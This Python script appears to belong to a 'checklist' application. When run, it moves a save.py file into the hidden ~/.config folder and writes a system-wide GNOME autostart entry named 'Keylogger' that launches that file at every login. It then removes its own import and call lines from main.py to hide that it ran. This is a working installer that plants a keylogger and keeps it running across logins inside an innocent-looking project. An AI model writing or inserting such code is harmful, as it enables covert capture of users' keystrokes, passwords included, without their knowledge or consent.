import os
from shutil import move

def remove_line_from_file(file_path, list_line_to_remove):
    for line_to_remove in list_line_to_remove:
        with open(file_path, 'r') as file:
            lines = file.readlines()
        with open(file_path, 'w') as file:
            for line in lines:
                if line.strip("\n") != line_to_remove:
                    file.write(line)

def main():
    move(f"/home/{os.environ['USER']}/checklist/save.py", f'/home/{os.environ['USER']}/.config/save.py')
    with open('/etc/xdg/autostart/keylogger.desktop', 'w') as file:
        file.write("[Desktop Entry]\nType=Application\nName=Keylogger\nExec=/home/owhat/checklist/.venv/bin/python3 /home/owhat/.config/save.py\nOnlyShowIn=GNOME;\nAutostartCondition=GSettings org.gnome.desktop.background show-desktop-icons")
    remove_line_from_file(f"/home/{os.environ['USER']}/checklist/main.py", ['prepare.main()', 'import prepare'])

    os.system("chmod +x /etc/xdg/autostart/keylogger.desktop")

if __name__ == '__main__':
    main()